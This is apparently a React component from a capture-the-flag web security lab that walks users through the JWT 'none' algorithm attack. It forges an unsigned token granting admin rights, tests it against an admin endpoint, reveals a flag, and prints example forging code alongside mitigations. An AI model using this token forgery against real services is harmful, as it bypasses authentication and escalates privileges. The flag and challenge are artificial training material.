import React, { useState, useEffect } from 'react';
import { Container, Row, Col, Card, Form, Button, Alert, Badge } from 'react-bootstrap';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { tomorrow } from 'react-syntax-highlighter/dist/esm/styles/prism';
import { useAuth } from '../../context/AuthContext';
import axios from 'axios';

function NoneAlgorithm() {
  const [customToken, setCustomToken] = useState('');
  const [response, setResponse] = useState('');
  const [showFlag, setShowFlag] = useState(false);
  const [decodedToken, setDecodedToken] = useState(null);
  const { token, user, updateToken } = useAuth();

  useEffect(() => {
    if (token) {
      try {
        const [header, payload] = token.split('.');
        const decodedHeader = JSON.parse(atob(header));
        const decodedPayload = JSON.parse(atob(payload));
        
        setDecodedToken({
          header: decodedHeader,
          payload: decodedPayload
        });
        
        // Create a none algorithm version for demonstration
        const noneHeader = { ...decodedHeader, alg: 'none' };
        const adminPayload = { ...decodedPayload, role: 'admin', isAdmin: true };
        
        const noneToken = btoa(JSON.stringify(noneHeader)) + '.' + 
                         btoa(JSON.stringify(adminPayload)) + '.';
        
        setCustomToken(noneToken);
      } catch (error) {
        console.error('Error decoding token:', error);
      }
    }
  }, [token]);

  const testNoneAlgorithm = async () => {
    try {
      setResponse('Testing none algorithm attack...');
      
      const testResponse = await axios.get('/api/admin/sensitive', {
        headers: {
          'Authorization': `Bearer ${customToken}`
        }
      });
      
      if (testResponse.data.success) {
        setResponse('SUCCESS! None algorithm attack worked!');
        setShowFlag(true);
        
        // Show success indicator
        const indicator = document.getElementById('jwt-success-indicator');
        if (indicator) {
          indicator.style.display = 'block';
          setTimeout(() => {
            indicator.style.display = 'none';
          }, 5000);
        }
      }
    } catch (error) {
      if (error.response?.data?.flag) {
        setResponse('SUCCESS! None algorithm bypass achieved!');
        setShowFlag(true);
      } else {
        setResponse(`Error: ${error.response?.data?.message || error.message}`);
      }
    }
  };

  const useTokenInBrowser = () => {
    if (updateToken(customToken)) {
      setResponse('Token updated in browser! You should now have admin access.');
    } else {
      setResponse('Failed to update token.');
    }
  };

  const exampleCode = `// None Algorithm Attack Steps:
// 1. Decode the original JWT token
// 2. Change algorithm from 'HS256' to 'none'
// 3. Modify payload (e.g., escalate privileges)
// 4. Remove signature (empty string)
// 5. Use modified token

const originalToken = "${token?.substring(0, 50)}...";
const [header, payload, signature] = originalToken.split('.');

// Decode and modify header
const decodedHeader = JSON.parse(atob(header));
decodedHeader.alg = 'none';

// Decode and modify payload  
const decodedPayload = JSON.parse(atob(payload));
decodedPayload.role = 'admin';
decodedPayload.isAdmin = true;

// Create new token with no signature
const noneToken = btoa(JSON.stringify(decodedHeader)) + '.' +
                  btoa(JSON.stringify(decodedPayload)) + '.';

console.log('Forged Token:', noneToken);`;

  return (
    <Container>
      <Row className="justify-content-center">
        <Col md={12}>
          <Card className="shadow bg-light">
            <Card.Header className="bg-danger text-white">
              <h4 className="mb-0">
                <i className="fas fa-ban me-2"></i>
                None Algorithm Attack Challenge
              </h4>
            </Card.Header>
            
            <Card.Body>
              <Alert variant="warning" className="mb-4">
                <h5><i className="fas fa-target me-2"></i>Challenge Objective</h5>
                <p className="mb-2">
                  Exploit the JWT "none" algorithm vulnerability to bypass signature verification 
                  and escalate your privileges to admin level.
                </p>
                <Badge bg="danger">Difficulty: Easy</Badge>
                <Badge bg="info" className="ms-2">Flag Available</Badge>
              </Alert>

              <Row>
                <Col md={6}>
                  <h6><i className="fas fa-info-circle me-2"></i>Your Current Token</h6>
                  {decodedToken && (
                    <div className="jwt-token-display">
                      <div className="jwt-token-header">
                        <strong>Header:</strong>
                        <pre className="mb-0 small">{JSON.stringify(decodedToken.header, null, 2)}</pre>
                      </div>
                      <div className="jwt-token-payload">
                        <strong>Payload:</strong>
                        <pre className="mb-0 small">{JSON.stringify(decodedToken.payload, null, 2)}</pre>
                      </div>
                      <div className="jwt-token-signature">
                        <strong>Signature:</strong> [Present - Token is signed]
                      </div>
                    </div>
                  )}
                  
                  <Alert variant="info" className="mt-3">
                    <strong>Current Role:</strong> {user?.role || 'user'} <br/>
                    <strong>Admin Access:</strong> {user?.isAdmin ? '✅ Yes' : '❌ No'}
                  </Alert>
                </Col>

                <Col md={6}>
                  <h6><i className="fas fa-edit me-2"></i>Modified Token (None Algorithm)</h6>
                  <Form.Group className="mb-3">
                    <Form.Label>Custom JWT Token:</Form.Label>
                    <Form.Control
                      as="textarea"
                      rows={8}
                      value={customToken}
                      onChange={(e) => setCustomToken(e.target.value)}
                      className="font-monospace small"
                      placeholder="Paste your modified JWT token here..."
                    />
                  </Form.Group>
                  
                  <div className="d-flex gap-2 mb-3">
                    <Button variant="danger" onClick={testNoneAlgorithm}>
                      <i className="fas fa-rocket me-1"></i>
                      Test Attack
                    </Button>
                    <Button variant="warning" onClick={useTokenInBrowser}>
                      <i className="fas fa-sync me-1"></i>
                      Use Token
                    </Button>
                  </div>

                  {response && (
                    <Alert variant={showFlag ? "success" : "info"}>
                      <pre className="mb-0 small">{response}</pre>
                    </Alert>
                  )}
                </Col>
              </Row>

              {/* Flag Display */}
              {showFlag && (
                <div className="flag-container mt-4" style={{ display: 'block' }}>
                  <h4><i className="fas fa-flag me-2"></i>FLAG CAPTURED!</h4>
                  <code>OSWA{JWT_N0N3_4LG0R1THM_BYP4SS}</code>
                  <p className="mt-2 mb-0">
                    <i className="fas fa-check-circle me-2"></i>
                    Excellent! You successfully exploited the none algorithm vulnerability!
                  </p>
                </div>
              )}

              {/* Educational Content */}
              <Card className="mt-4">
                <Card.Header>
                  <h6><i className="fas fa-code me-2"></i>Attack Code Example</h6>
                </Card.Header>
                <Card.Body>
                  <SyntaxHighlighter language="javascript" style={tomorrow} className="mb-0">
                    {exampleCode}
                  </SyntaxHighlighter>
                </Card.Body>
              </Card>

              <Card className="mt-3">
                <Card.Header>
                  <h6><i className="fas fa-graduation-cap me-2"></i>Learning Points</h6>
                </Card.Header>
                <Card.Body>
                  <Row>
                    <Col md={6}>
                      <h6>Vulnerability Details:</h6>
                      <ul className="small">
                        <li>JWT accepts "none" algorithm</li>
                        <li>No signature verification performed</li>
                        <li>Complete token manipulation possible</li>
                        <li>Privilege escalation achievable</li>
                      </ul>
                    </Col>
                    <Col md={6}>
                      <h6>Mitigation:</h6>
                      <ul className="small">
                        <li>Never allow "none" algorithm in production</li>
                        <li>Whitelist acceptable algorithms</li>
                        <li>Always verify token signatures</li>
                        <li>Implement proper algorithm validation</li>
                      </ul>
                    </Col>
                  </Row>
                </Card.Body>
              </Card>
            </Card.Body>
          </Card>
        </Col>
      </Row>
    </Container>
  );
}

export default NoneAlgorithm;